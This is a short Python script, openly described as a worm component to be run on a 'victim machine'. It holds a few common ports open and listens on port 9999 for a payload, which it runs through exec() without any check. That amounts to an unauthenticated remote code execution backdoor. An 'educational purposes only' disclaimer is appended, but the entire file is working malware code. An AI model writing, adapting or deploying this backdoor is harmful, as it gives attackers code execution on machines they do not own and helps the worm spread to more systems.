import socket
import threading

''' This code sets up a simple listener that opens multiple common ports and waits for incoming connections. It also listens on port 9999 for a worm payload, which it executes upon receipt. The open_port function keeps the specified ports open, while the receive_worm function handles incoming data on port 9999 and executes it as Python code.
run this in the victim machine to allow the worm to spread and execute its payload.
Note: This code is for educational purposes only and should not be used for malicious activities. Always ensure you have permission to run such code on any network or system. '''

def open_port(port):
    s = socket.socket()# Create a new socket object
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)# Allow reuse of the address
    s.bind(("0.0.0.0", port))# Bind to all interfaces on the specified port
    s.listen(5)# Listen for incoming connections with a backlog of 5
    while True:
        conn, _ = s.accept()# Accept an incoming connection and get the connection object and client address(not used here)
        conn.close()# Close the connection immediately after accepting it, effectively keeping the port open without doing anything with the incoming data

def receive_worm():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 9999))# Bind to all interfaces on port 9999 for receiving the worm payload
    s.listen(5)
    while True:
        conn, _ = s.accept()# Accept an incoming connection on port 9999
        data = b""# Initialize an empty bytes object to store the incoming data
        while True:
            chunk = conn.recv(4096)# Receive data in chunks of 4096 bytes until no more data is sent (indicated by an empty chunk)
            if not chunk:
                break
            data += chunk# Append the received chunk to the data variable until all data is received
        conn.close()
        exec(data.decode())# Decode the received data from bytes to a string and execute it as Python code, allowing the worm payload to run on the infected machine

for port in [21, 22, 80, 443, 3306, 8080]:# List of common ports to open for the worm to spread
    threading.Thread(target=open_port, args=(port,), daemon=True).start()# Start a new thread for each port in the list to open them simultaneously 

receive_worm()# Start the function to receive the worm payload on port 9999